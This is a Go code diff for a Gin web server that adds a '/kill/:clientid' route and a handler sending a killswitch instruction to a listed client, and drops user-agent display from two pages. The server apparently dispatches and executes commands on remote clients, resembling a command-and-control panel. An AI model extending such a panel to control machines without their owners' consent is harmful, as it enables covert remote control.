@@ -31,13 +31,13 @@ func WebServer() {
 	r.GET("/", getRoot)
 	r.GET("/command/:clientid", getCommands)
 	r.POST("/command/:clientid", execCMD)
+	r.POST("/kill/:clientid", sendKillswitch)
 	r.Run(":" + WebPort)
 }
 
 func getRoot(c *gin.Context) {
 	c.HTML(http.StatusOK, "templates/index.html", gin.H{
-		"UserAgent": c.Request.UserAgent(),
-		"Clients":   clientList,
+		"Clients": clientList,
 	})
 }
 
@@ -54,9 +54,22 @@ func getCommands(c *gin.Context) {
 		return
 	}
 	c.HTML(http.StatusOK, "templates/command.html", gin.H{
-		"UserAgent": c.Request.UserAgent(),
-		"Client":    client,
+		"Client": client,
 	})
+}
+
+func sendKillswitch(c *gin.Context) {
+	clientID := c.Param("clientid")
+	intClientID, err := strconv.Atoi(clientID)
+	if err != nil {
+		c.String(http.StatusInternalServerError, "Error happened fetching client: %v", err)
+		return
+	}
+	inst := Instructions{
+		IsKillswitch: true,
+	}
+	clientList[intClientID].Instruct(inst)
+	clientList[intClientID].IsOnline = false
 }
 
 func execCMD(c *gin.Context) {
